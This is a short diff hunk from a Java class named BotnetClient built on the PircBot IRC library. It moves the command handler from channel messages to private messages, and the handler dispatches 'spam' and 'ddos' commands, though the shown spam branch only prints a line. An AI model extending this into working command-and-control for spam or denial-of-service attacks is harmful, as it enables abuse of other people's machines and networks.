@@ -44,7 +44,7 @@ public class BotnetClient extends PircBot {
 		}
 	}
 		
-	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
+	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
 		if (message.toLowerCase().startsWith("spam")) {
 			System.out.println("Sending Spam");
 		} else if (message.toLowerCase().startsWith("ddos")) {
